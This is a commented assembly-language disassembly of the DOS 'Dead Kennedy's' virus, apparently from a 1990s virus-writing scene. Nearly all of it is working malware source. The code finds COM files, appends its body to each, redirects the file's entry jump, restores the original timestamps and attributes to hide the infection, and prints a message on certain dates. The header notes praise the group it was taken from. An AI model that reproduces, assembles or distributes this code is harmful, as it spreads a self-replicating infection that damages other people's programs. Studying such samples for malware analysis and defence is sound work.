;*****************************************************************************
;
; The Dead Kennedy's Virus.
;
; Disassembled By Admiral Bailey [YAM '92]
;
; Notes: Well I found this virus in its hex for in the 40hex-6 mag just
;        yesterday and I just wanted to dissassemble it.  Well here is the
;        code.  I commented and all.  You should be able to understand it.  I
;        hope.  If you want to know what it does then check out what vsum says
;        about it or just check out the code below.  I just wanna say yo to
;        the 40hex crew where i got this and all off you readers should check
;        them out.  They are a very informative group and you can learn a lot
;        from them.
;
;*****************************************************************************

data_1e         equ     9Eh

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h

kennedy         proc    far

start:
                jmp     begin
begin_2:                                        ; loc_2:
                nop
                nop
                nop
                int     20h                     ; DOS program terminate
                db      4Bh, 65h, 6Eh, 6Eh, 65h, 64h, 79h ; 'Kennedy'
begin:                                           ; loc_3:
                call    real_v

kennedy         endp

;*****************************************************************************
;  This is the subroutine that does the basic stuff like file finding and
;  date comparing
;*****************************************************************************

real_v          proc    near                    ; sub_1
                pop     si
                sub     si,10Fh
                mov     bp,word ptr ds:[20Bh][si]
                mov     ah,2Ah                  ; get date dh=month
                int     21h                     ; dl=day, al=dayofweek 0sun

                cmp     dx,606h                 ; is it june 6?
                je      write_messege           ; yup
                cmp     dx,0B12h                ; is it november 18?
                je      write_messege           ; yup
                cmp     dx,0B16h                ; is it november 22?
                je      write_messege           ; yup
                lea     dx,[si+20Dh]            ; get file type to look for
                xor     cx,cx                   ; find read only
                mov     ah,4Eh                  ; find first file
find_file:                                      ; loc_4:
                int     21h                     ; find a file

                jc      loc_5                   ; none found...
                call    work_with_file          ; now get file
                jc      loc_5                   ; jump if carry
                mov     ah,4Fh                  ; find next file
                jmp     short find_file         ; do it
loc_5:
                mov     ax,bp
                add     ax,offset begin_2
                jmp     ax                      ;*Register jump
write_messege:                                  ; loc_6:
                lea     dx,[si+220h]            ; load the string to print
                mov     ah,9                    ; print string
                int     21h

                jmp     short loc_5
real_v          endp


;*****************************************************************************
;  This is the procedure that is called to do the file infection and all.
;*****************************************************************************

work_with_file  proc    near                    ; sub_2
                mov     ax,4300h                ; get files attrib
                mov     dx,data_1e              ; filename
                int     21h

                mov     data_3[si],cx           ; save attribs
                mov     ax,4301h                ; set attribs
                xor     cx,cx                   ; set to 0
                int     21h                     

                mov     ax,3D02h                ; open file al=mode
                int     21h

                mov     bx,ax
                mov     ah,3Fh                  ; read file
                lea     dx,[si+252h]            ; buffer to hold bytes
                mov     di,dx
                mov     cx,3                    ; read 3 bytes
                int     21h

                cmp     byte ptr [di],0E9h
                je      infect_file
quit_early:                                     ; loc_7:
                call    set_attribs
                clc                             ; Clear carry flag
                retn
infect_file:                                    ; loc_8:
                mov     dx,[di+1]
                mov     word ptr ds:[20Bh][si],dx
                xor     cx,cx                   ; Zero register
                mov     ax,4200h                ; move the files ptr
                int     21h

                mov     dx,di
                mov     cx,2                    ; read 2 more bytes
                mov     ah,3Fh                  ; read file
                int     21h                     

                cmp     word ptr [di],6465h
                je      quit_early              ; Jump if equal
                xor     dx,dx                   ; move file ptr to beginning
                xor     cx,cx
                mov     ax,4202h                ; move file ptr
                int     21h

                cmp     dx,0
                jne     quit_early              ; Jump if not equal
                cmp     ax,0FDE8h
                jae     quit_early              ; Jump if above or equal
                add     ax,4
                mov     data_6[si],ax
                mov     ax,5700h                ; get files date+time
                int     21h                     ; cx=time dx=time

                mov     data_4[si],cx           ; save the time
                mov     data_5[si],dx           ; save the time
                mov     ah,40h                  ; write to file
                lea     dx,[si+105h]            ; start writing here
                mov     cx,14Dh                 ; size of virus
                int     21h

                jc      forget_this_file        ; if error then close up
                mov     ax,4200h                ; move file pointer
                xor     cx,cx
                mov     dx,1                    ; 1 byte
                int     21h

                mov     ah,40h                  ; write to file
                lea     dx,[si+25Bh]            ; start here
                mov     cx,2                    ; write the two bytes
                int     21h                     

forget_this_file:                               ; loc_9:
                mov     cx,data_4[si]           ; get back old files time
                mov     dx,data_5[si]           ; get old files time
                mov     ax,5701h                ; set files date+time
                int     21h                     

                mov     ah,3Eh                  ; now close up the file
                int     21h                     ;

                call    set_attribs             ; now fix back the attribs
                stc                             ; Set carry flag
                retn
work_with_file  endp


;*****************************************************************************
;  This procedure just sets back the attribs to normal
;*****************************************************************************

set_attribs     proc    near                    ; sub_3
                mov     ax,4301h                ; set attrib
                mov     cx,data_3[si]           ; to this
                int     21h
                retn
set_attribs     endp

                db       03h, 00h, 2Ah, 2Eh, 43h, 4Fh
                db       4Dh, 00h
                db      '\COMMAND.COM'
                db      0
                db      'Kennedy er d'
                db       9Bh, 64h, 20h, 2Dh, 20h, 6Ch
                db       91h
                db      'nge leve "The Dead Kennedys"', 0Dh
                db      0Ah, '$'
data_3          dw      0                       ; These hold data such as
data_4          dw      0                       ; date, time, attrib etc
data_5          dw      0
data_6          dw      0                       
                db      35 dup (0)                      ; I guess the junk
                db      'e(s) copied', 0Dh, 0Ah, 0      ; below is just stuff
                db      9, '9pD%9d File(s) ', 0         ; from the leftover
                db      '"9wD'                          ; file before.
                db      '%9ld bytes free', 0Dh, 0Ah, 0
                db      '39yD{DInvalid d'
                db      'rive specification', 0Dh, 0Ah, 0
                db      'K9', 0Dh, 0Ah, 'Code page %5d no'
                db      't prepared for system', 0Dh, 0Ah
                db      0
                db      'k9/?', 0Dh, 0Ah, 'Code page %5d '
                db      'not prepared for all devices', 0Dh
                db      0Ah, 0
                db      99h
                db      '9/?', 0Dh, 0Ah, 'Active code pag'
                db      'e: %5d', 0Dh, 0Ah
                db       00h,0CCh
                db      '9/?Current drive is no longer va'
                db      'lid', 0
                db      0EAh, 39h, 53h, 74h

seg_a           ends

                end     start
                